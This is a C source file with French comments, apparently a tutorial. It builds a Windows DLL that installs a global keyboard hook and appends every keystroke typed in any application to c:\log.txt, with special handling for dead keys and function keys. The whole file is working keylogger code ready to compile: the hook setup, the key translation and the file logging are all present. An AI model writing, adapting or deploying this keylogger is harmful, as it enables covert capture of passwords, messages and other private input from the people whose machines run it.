
//==============================================================================
// Hook Clavier Global Avec Gestion Des DEAD KEYS
//------------------------------------------------------------------------------
// Ce programme intercepte toutes les touches du clavier sur lesquelles vous
// tapez, quelle que soit l'application.
// Un fichier texte est créé (c:\log.txt) dans lequel vous trouverez le début
// et la fin du hook, les touches appuyées.
//------------------------------------------------------------------------------
// Pour les "experts" :
// Dans la fonction de hook, on utilise la fonction ToAscii. Cette fonction
// gère très mal les DEAD KEYS. Les DEAD KEYS sont les caractères qui doivent
// être combinés à un autre pour ne former qu'un ( ^ + e = ê ).
// Si on doit traiter une DEAD KEY, il est obligatoire d'utiliser une autre
// fonction. J'ai opté pour GetKeyNameText ( )
// Important également, le fichier texte n'est pas constamment ouvert. Il n'est
// ouvert que lorsqu'on veut y écrire un caractère puis on le referme. En effet,
// si notre programme n'est pas quitté correctement, il se peut qu'il y ait des
// problèmes pour réouvrir ce fichier. D'autant plus qu'on écrira pas assez vite
// pour mettre en défaut cette façon de faire.
//==============================================================================


//------------------------------------------------------------------------------
// INCLUDES
//------------------------------------------------------------------------------

    #include <windows.h>            // Header pour DevCpp

//------------------------------------------------------------------------------
// Constantes & Macros
//------------------------------------------------------------------------------

    // A ajouter devant une fonction pour l'exporter ou l'importer
    #define DLLEXPORT   __declspec (dllexport)
    #define DLLIMPORT   __declspec (dllimport)

//------------------------------------------------------------------------------
// Variables Globales De La DLL
//------------------------------------------------------------------------------

    HHOOK   HKEYBOARD;                      // Hook Clavier
    HINSTANCE HInst;                        // Handle d'intance de la DLL
    char    FILENAME[] = "c:\\log.txt";     // Chemin du log

//------------------------------------------------------------------------------
// Ecriture à la fin d'un fichier texte
//------------------------------------------------------------------------------

DWORD myfprintf ( LPCVOID texte )
{
    HANDLE  logfic;                         // Handle du fichier
    DWORD   taille=0;                       // Nombre d'octets effectivement écrits
    
    // Ouverture et positionnement à la fin du fichier pour ajout
    logfic = CreateFile ( FILENAME, GENERIC_WRITE, 0, 0, OPEN_ALWAYS, FILE_FLAG_SEQUENTIAL_SCAN, NULL );
    if ( logfic != INVALID_HANDLE_VALUE )
    {
        SetFilePointer ( logfic, 0, 0, FILE_END );
        WriteFile ( logfic, texte, strlen(texte), &taille, NULL );
        CloseHandle ( logfic );
    }
    return taille;
}

//------------------------------------------------------------------------------
// Retourne 0 si le caractère est un DEAD CHAR (accent circonflexe, trema, etc ...)
//------------------------------------------------------------------------------

BOOL is_dead_key ( int wparam )
{
    unsigned int code = MapVirtualKey ( wparam, 2 );

    // Windows 95 retourne 0x8000, NT retourne 0x80000000
    return (code & 0x80008000) ? TRUE : FALSE;
}

//------------------------------------------------------------------------------
// Fonctions executée lorsqu'on appuie sur une touche
//------------------------------------------------------------------------------
// lParam est composé de 32 bits (de 31 à 0) :
// touche appuyée   : bit 31 [FALSE] bit 30 [FALSE]
// touche maintenue : bit 31 [FALSE] bit 30 [TRUE]
// touche relachée  : bit 31 [TRUE]  bit 30 [TRUE]
// scancode         : bit 23 au bit 16 inclus
//------------------------------------------------------------------------------

LRESULT CALLBACK KeyboardProc ( int nCode,WPARAM wParam,LPARAM lParam )
{
    BYTE KeyState[256];                 // Etat des 256 touches du clavier
    static BOOL deadkey;                // Est-ce qu'on a traité une DEAD KEY
    WORD Char=0;                        // Buffer pour la traduction de la touche (ToAscii)
    char nomTouche[256];                // Buffer pour la traduction de la touche (GetKeyNameText)

    // On ne fait rien dans ce cas (cf aide API)
    if ( nCode < 0 || nCode == HC_NOREMOVE )
        return CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );

    // Pour éviter les répétitions
    // Bit 30 : Spécifie l'état précédent de la touche (si TRUE, on passe notre chemin)
    if ( ((DWORD)lParam & 1<<30) != FALSE )
        return CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );
        
    // Si c'est une DEAD KEY, on passe notre chemin
    if ( is_dead_key ( (UINT) wParam ) )
    {
        deadkey = TRUE;
        myfprintf ( "[DK]" );
        return CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );
    }

    switch(wParam)
    {
    case VK_BACK    : myfprintf ( "[BKSP]" );   break;  // 0x08
    case VK_TAB     : myfprintf ( "[TAB]" );    break;  // 0x09
    case VK_RETURN  : myfprintf ( "[ENTER]\r\n" );break;  // 0x0D
    case VK_SHIFT   :                           break;  // 0x10
    case VK_CONTROL : myfprintf ( "[CTRL]" );   break;  // 0x11
    case VK_MENU    : myfprintf ( "[ALT]" );    break;  // 0x12
    case VK_PAUSE   : myfprintf ( "[PAUSE]" );  break;  // 0x13
    case VK_CAPITAL :                           break;  // 0x14
    case VK_ESCAPE  :                           break;  // 0x1B
    case VK_PRIOR   : myfprintf ( "[PGUP]" );   break;  // 0x21
    case VK_NEXT    : myfprintf ( "[PGDN]" );   break;  // 0x22
    case VK_END     : myfprintf ( "[END]" );    break;  // 0x23
    case VK_HOME    : myfprintf ( "[HOME]" );   break;  // 0x24
    case VK_LEFT    : myfprintf ( "[LEFT]" );   break;  // 0x25
    case VK_UP      : myfprintf ( "[UP]" );     break;  // 0x26
    case VK_RIGHT   : myfprintf ( "[RIGHT]" );  break;  // 0x27
    case VK_DOWN    : myfprintf ( "[DOWN]" );   break;  // 0x28
    case VK_SNAPSHOT: myfprintf ( "[SNAP]" );   break;  // 0x2C
    case VK_INSERT  :                           break;  // 0x2D
    case VK_DELETE  : myfprintf ( "[DEL]" );    break;  // 0x2E
    case VK_LWIN    : myfprintf ( "[LWIN]" );   break;  // 0x5B
    case VK_RWIN    : myfprintf ( "[RWIN]" );   break;  // 0x5C
    case VK_APPS    : myfprintf ( "[APPS]" );   break;  // 0x5D
    case VK_NUMPAD0 : myfprintf ( "[NUM0]" );   break;  // 0x60
    case VK_NUMPAD1 : myfprintf ( "[NUM1]" );   break;  // 0x61
    case VK_NUMPAD2 : myfprintf ( "[NUM2]" );   break;  // 0x62
    case VK_NUMPAD3 : myfprintf ( "[NUM3]" );   break;  // 0x63
    case VK_NUMPAD4 : myfprintf ( "[NUM4]" );   break;  // 0x64
    case VK_NUMPAD5 : myfprintf ( "[NUM5]" );   break;  // 0x65
    case VK_NUMPAD6 : myfprintf ( "[NUM6]" );   break;  // 0x66
    case VK_NUMPAD7 : myfprintf ( "[NUM7]" );   break;  // 0x67
    case VK_NUMPAD8 : myfprintf ( "[NUM8]" );   break;  // 0x68
    case VK_NUMPAD9 : myfprintf ( "[NUM9]" );   break;  // 0x69
    case VK_MULTIPLY: myfprintf ( "*" );        break;  // 0x6A
    case VK_ADD     : myfprintf ( "+" );        break;  // 0x6B
    case VK_SUBTRACT: myfprintf ( "-" );        break;  // 0x6D
    case VK_DECIMAL : myfprintf ( "." );        break;  // 0x6E
    case VK_DIVIDE  : myfprintf ( "/" );        break;  // 0x06
    case VK_F1      : myfprintf ( "[F1]" );     break;  // 0x70
    case VK_F2      : myfprintf ( "[F2]" );     break;  // 0x71
    case VK_F3      : myfprintf ( "[F3]" );     break;  // 0x72
    case VK_F4      : myfprintf ( "[F4]" );     break;  // 0x73
    case VK_F5      : myfprintf ( "[F5]" );     break;  // 0x74
    case VK_F6      : myfprintf ( "[F6]" );     break;  // 0x75
    case VK_F7      : myfprintf ( "[F7]" );     break;  // 0x76
    case VK_F8      : myfprintf ( "[F8]" );     break;  // 0x77
    case VK_F9      : myfprintf ( "[F9]" );     break;  // 0x78
    case VK_F10     : myfprintf ( "[F10]" );    break;  // 0x79
    case VK_F11     : myfprintf ( "[F11]" );    break;  // 0x7A
    case VK_F12     : myfprintf ( "[F12]" );    break;  // 0x7B
    case VK_F13     : myfprintf ( "[F13]" );    break;  // 0x7C
    case VK_F14     : myfprintf ( "[F14]" );    break;  // 0x7D
    case VK_F15     : myfprintf ( "[F15]" );    break;  // 0x7E
    case VK_F16     : myfprintf ( "[F16]" );    break;  // 0x7F
    case VK_F17     : myfprintf ( "[F17]" );    break;  // 0x80
    case VK_F18     : myfprintf ( "[F18]" );    break;  // 0x81
    case VK_F19     : myfprintf ( "[F19]" );    break;  // 0x82
    case VK_F20     : myfprintf ( "[F20]" );    break;  // 0x83
    case VK_F21     : myfprintf ( "[F21]" );    break;  // 0x84
    case VK_F22     : myfprintf ( "[F22]" );    break;  // 0x85
    case VK_F23     : myfprintf ( "[F23]" );    break;  // 0x86
    case VK_F24     : myfprintf ( "[F24]" );    break;  // 0x87
    case VK_NUMLOCK :                           break;  // 0x90
    case VK_ATTN    :                           break;  // 0xF6
    default:
        // On réinitialise notre tableau
        memset ( KeyState, 0, sizeof(KeyState) );
        
        if ( GetKeyboardState ( KeyState ) )
        {
            // ce n'est pas une DEAD KEY, on peut utiliser ToAscii
            if ( !deadkey )
            {
                ToAscii ( (UINT) wParam, (UINT) ((lParam << 8 ) >> 24), KeyState, &Char, 0 );
                myfprintf ( &Char );
            }
            // sinon, on doit utiliser autre chose !
            else
            {
                GetKeyNameText ( lParam, nomTouche, 256 );
                myfprintf ( nomTouche );
                deadkey = FALSE;
            }
        }
        break;
    }

    return CallNextHookEx ( HKEYBOARD, nCode, wParam, lParam );
}


//------------------------------------------------------------------------------
// Fonction principale d'Initialisation De La DLL
//------------------------------------------------------------------------------
// hinst  : l'instance de notre programme
// raison : pourquoi notre DLL est utilisée
// reserv : non utilisé
// retourne vrai si l'opération s'est bien déroulé
//------------------------------------------------------------------------------


BOOL APIENTRY DllMain ( HINSTANCE hinst, DWORD raison, LPVOID reserv )
{
    if ( raison == DLL_PROCESS_ATTACH )
        HInst = hinst;
    return TRUE;
}


//------------------------------------------------------------------------------
// Initialisation Du Hook Clavier                             FONCTION EXPORTEE
//------------------------------------------------------------------------------


void DLLEXPORT InitHook ( void )
{
    HKEYBOARD = SetWindowsHookEx ( WH_KEYBOARD, (HOOKPROC)KeyboardProc, HInst, 0 );
}


//------------------------------------------------------------------------------
// Terminaison Des Hooks                                     FONCTION EXPORTEE
//------------------------------------------------------------------------------


void DLLEXPORT EndHook ( void )
{
    UnhookWindowsHookEx ( HKEYBOARD );
}


//==============================================================================
// EOF
//==============================================================================

